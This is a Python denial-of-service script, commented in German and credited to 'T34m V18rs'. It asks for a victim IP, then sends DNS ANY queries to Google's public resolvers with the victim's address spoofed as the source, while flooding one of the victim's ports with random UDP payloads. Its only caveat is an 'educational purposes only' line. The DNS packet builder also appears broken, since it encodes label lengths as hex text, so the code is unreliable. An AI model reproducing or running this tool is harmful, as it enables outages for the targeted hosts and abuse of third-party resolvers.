from scapy.all import *
import random
import os
import time
import socket
import threading

# Globale Variablen
stop_event = threading.Event()

# Funktion zur Erstellung eines DNS-Abfragepakets (ANY-Record)
def build_dns_packet(target_domain):
    """Erstellt ein DNS-Abfragepaket."""
    transaction_id = random.randint(0, 65535).to_bytes(2, byteorder="big")
    flags = b'\x01\x00'  # Standard-DNS-Abfrage
    questions = b'\x00\x01'  # 1 Frage
    answer_rrs = b'\x00\x00'
    authority_rrs = b'\x00\x00'
    additional_rrs = b'\x00\x00'
    query = b''.join([bytes(f"{len(part):02x}", "utf-8") + part.encode() for part in target_domain.split('.')]) + b'\x00'
    query_type = b'\x00\xff'  # ANY-Record
    query_class = b'\x00\x01'  # IN (Internet)
    return transaction_id + flags + questions + answer_rrs + authority_rrs + additional_rrs + query + query_type + query_class

# DNS Amplification Attack
def dns_amplification(victim_ip, resolver_ip, target_domain):
    """Sendet DNS Amplification-Pakete."""
    dns_packet = build_dns_packet(target_domain)
    udp_packet = IP(src=victim_ip, dst=resolver_ip) / UDP(dport=53) / dns_packet

    while not stop_event.is_set():
        send(udp_packet, verbose=False)

# UDP Flood Attack
def udp_flood(ip, port, duration=10):
    """Führt einen UDP-Flood-Angriff aus."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(1490)
    timeout = time.time() + duration

    while time.time() < timeout and not stop_event.is_set():
        sock.sendto(payload, (ip, port))
        print(f"Sent UDP packet to {ip} through port {port}")

# Multi-Vector Angriff
def multi_vector_attack(victim_ip, resolver_list, target_domain, port, duration=10):
    """Startet DNS Amplification und UDP-Flood gleichzeitig."""
    threads = []

    try:
        # DNS Amplification Threads
        for resolver_ip in resolver_list:
            thread = threading.Thread(target=dns_amplification, args=(victim_ip, resolver_ip, target_domain))
            threads.append(thread)
            thread.start()

        # UDP Flood Thread
        udp_thread = threading.Thread(target=udp_flood, args=(victim_ip, port, duration))
        threads.append(udp_thread)
        udp_thread.start()

        # Wartezeit für die Angriffe
        time.sleep(duration)
        stop_event.set()

        # Warte auf alle Threads
        for thread in threads:
            thread.join()

    except KeyboardInterrupt:
        stop_event.set()
        print("\nAngriff gestoppt!")
    finally:
        print("\nMulti-Vector Angriff beendet.")

# Benutzeroberfläche
def main():
    os.system("clear")
    os.system("figlet Multi-Vector Attack")
    print("Coded By : T34m V18rs")
    print("Hinweis: Nur für Bildungszwecke. Verwendung auf eigene Verantwortung.")
    print("\n")

    victim_ip = input("Ziel-IP: ")
    port = int(input("Ziel-Port (für UDP Flood): "))
    duration = int(input("Angriffsdauer (in Sekunden): "))
    resolver_list = ["8.8.8.8", "8.8.4.4"]  # DNS Resolver
    target_domain = input("Ziel-Domain für DNS Amplification (z. B. example.com): ")

    print("\nAngriff wird vorbereitet...\n")
    time.sleep(3)
    os.system("clear")
    os.system("figlet Angriff gestartet!")
    multi_vector_attack(victim_ip, resolver_list, target_domain, port, duration)

if __name__ == "__main__":
    main()
